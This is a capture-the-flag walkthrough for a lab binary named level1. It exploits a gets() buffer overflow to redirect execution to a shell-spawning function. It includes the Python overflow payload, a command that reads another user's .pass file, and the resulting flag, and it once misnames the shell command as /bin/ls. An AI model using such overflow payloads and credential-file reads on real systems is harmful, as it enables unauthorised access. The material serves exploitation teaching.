# level1

We find an executable `level1`. We run `gdb level1` to examine it.

`disas main` yields us a very simple main ; it only does a `gets` and exits. `info functions` shows us other functions, and among them, one called `run` ; and `disas run` shows a function that runs a `system("/bin/sh")`.

What can we do here ? The run function we're looking for isn't naturally called by `main`. We'll have to use the `gets` to call `run`. Here's how we can do that :

## **The exploit**

`gets` is famous for being vulnerable to buffer overflows. If you overwrite further than the buffer, you can overwrite certain parts of the stack. Here, we want to overwrite the **return address of the main function** : the `eip` register.

Through experimentation, we find we can overwrite `eip` from character 77 to character 80 of the `gets`. This means writing 76 characters + the desired address will trick the program into going where we want.

We use Python to make our output easier :

```
python -c 'print("A" * 76 + DESIRED_ADDRESS)'
```

`disas run` gave us the address of run : `0x08048444`. We add it to our output, reversing to bytes to account for endianness :

```
python2 -c 'print("A" * 76 + "\x44\x84\x04\x08")'
```

Finally, we have to pipe it into the executable. But there's an issue : when `system("/bin/sh")` is ran, it'll read from `stdin`, and since we're overloading `stdin`, we'll need to add a `cat` in the mix. We run :

```
( python -c 'print("A" * 76 + "\x44\x84\x04\x08")' ; cat ) | ./level1
```

## **The flag**

The `python -c` overflows `gets`, `eip` is filled with the `run` address, `system("/bin/ls")` is ran and our `cat` is asked for a command. We run :

```
cat /home/user/level2/.pass
```

... and get the flag for `level1` :

```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```